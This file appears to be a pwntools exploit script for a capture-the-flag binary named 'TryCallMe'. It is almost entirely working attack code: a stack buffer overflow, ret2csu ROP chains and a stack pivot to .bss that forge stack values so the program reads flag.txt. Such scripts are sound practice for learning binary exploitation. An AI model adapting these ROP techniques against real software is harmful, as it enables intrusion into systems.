#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dubwewsub.joints.id --port 51708 ./TryCallMe
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./TryCallMe')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dubwewsub.joints.id'
port = int(args.PORT or 51708)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x000000000040136a
b *0x00000000004011aa
b *0x0000000000401209
b *0x401278
continue
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


pop_csu = 0x4013c2
call_csu = 0x4013a8

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 0, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0, pop=True):
    p_csu = ''
    if pop == True:
        p_csu += p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(edi) # r12
        p_csu += p64(rsi) # r13
        p_csu += p64(rdx) # r14
        p_csu += p64(call_func) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu

def d2d(f): # double to decimal
    return struct.unpack('<Q', struct.pack('<d', f))[0]

pop_rbp = 0x0000000000401149
leave = 0x000000000040136a
read_got = exe.got['read']
trycallme_62= 0x4011a0

io = start()

p = "A" * (120)
p += ret2csu(read_got, 0 , exe.bss()+0x800, 600, rbp_a = exe.bss()+0x800-8)
p += p64(trycallme_62)
io.send(p.ljust(0x100, "X"))

print hex(d2d(35.34))
p = p64(pop_rbp)
p += p64(exe.bss()+0x800+0x70+24)
p += p64(trycallme_62)
# stack
p += 'flag.txt' # [rbp-0x70] file
p += p64(0) # [rbp-0x68] a5
p += p64(d2d(74.53)) # [rbp-0x60] v15
p += p64(0xd8ca444cc6c22e) # [rbp-0x58] a6
p += p64(d2d(134.64-35.34)) # [rbp-0x50] v17
p += p64(0xB333F1AC485DFFE9 ^ 1) # [rbp-0x48] b
p += p64(d2d(118.48-35.34)) # [rbp-0x40] v19
p += p64(1) # [rbp-0x38] # d
p += p64(d2d(95.68000000000001)) # [rbp-0x30] v21
p += p64(1) # [rbp-0x28]# a
p += p64(d2d(35.34)) # [rbp-0x20] # v23
p += p64(0xB333F1AC485DFFE9 + 1) # [rbp-0x18] c

io.send(p.ljust(600, "X"))

io.interactive()
